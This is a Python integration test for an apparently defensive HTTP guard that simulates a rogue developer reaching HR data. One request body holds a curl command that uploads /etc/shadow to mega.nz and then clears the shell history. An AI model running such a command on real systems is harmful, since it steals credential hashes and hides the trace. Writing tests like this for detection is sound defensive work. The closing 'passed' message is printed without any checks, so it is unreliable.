import os
import sys

# Add src directory to PYTHONPATH
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "src")))

from interceptor.http_proxy import create_http_guard_app
from fastapi.testclient import TestClient

def main():
    print("=== STARTING SANDBOX INTEGRATION TEST ===")
    
    # Mock configuration matching settings.yaml structure
    config = {
        "runtime": {
            "db_path": "./runtime/test_adaptiveshield.db",
            "threat_log_path": "./runtime/logs/test_threat_events.jsonl"
        },
        "http_guard": {
            "real_service_host": "127.0.0.1",
            "real_service_port": 8080,
            "request_timeout_sec": 5,
            "brute_force_threshold": 5,
            "block_duration_minutes": 10,
            "fallback_on_error": False
        },
        "decoys": {
            "http_image": "adaptiveshield/http-decoy:latest",
            "max_instances": 2,
            "idle_timeout_sec": 60,
            "fallback_url": "http://127.0.0.1:8081"
        }
    }
    
    # Clean old test DB if it exists
    if os.path.exists("./runtime/test_adaptiveshield.db"):
        os.remove("./runtime/test_adaptiveshield.db")
        
    print("Creating HTTP Guard FastAPI App with custom config...")
    app = create_http_guard_app(config)
    client = TestClient(app, client=("192.168.1.10", 50000))
    
    print("\n--- Test Scenario 1: Normal User Request (Private IP) ---")
    headers = {
        "x-user-id": "dev_clerk_01",
        "x-user-role": "developer"
    }
    response = client.get("/health", headers=headers)
    print(f"Response Code: {response.status_code}")
    print(f"Response Body: {response.json()}")
    
    print("\n--- Test Scenario 2: Rogue Dev accessing payroll late at night and uploading ---")
    # Simulate a series of requests to trigger malicious profile rules
    headers_rogue = {
        "x-user-id": "dev_rogue_01",
        "x-user-role": "developer"
    }
    # 1. Access HR DB (unauthorized scope for developer)
    client.post("/hr/employees.csv", headers=headers_rogue)
    # 2. Exfiltrate files via command line (cloud upload mega.nz + log deletion attempt)
    client.post("/etc/shadow", headers=headers_rogue, json={
        "command": "curl -F file=@/etc/shadow mega.nz/upload; history -c",
        "cloud_upload": True
    })
    
    print("Checking if IP blocking and threat score logged successfully...")
    if os.path.exists("./runtime/logs/test_threat_events.jsonl"):
        with open("./runtime/logs/test_threat_events.jsonl", "r", encoding="utf-8") as f:
            logs = f.readlines()
            for line in logs:
                print(f"Log event: {line.strip()}")
                
    print("\n=== INTEGRATION TEST PASSED SUCCESSFULLY ===")

if __name__ == "__main__":
    main()
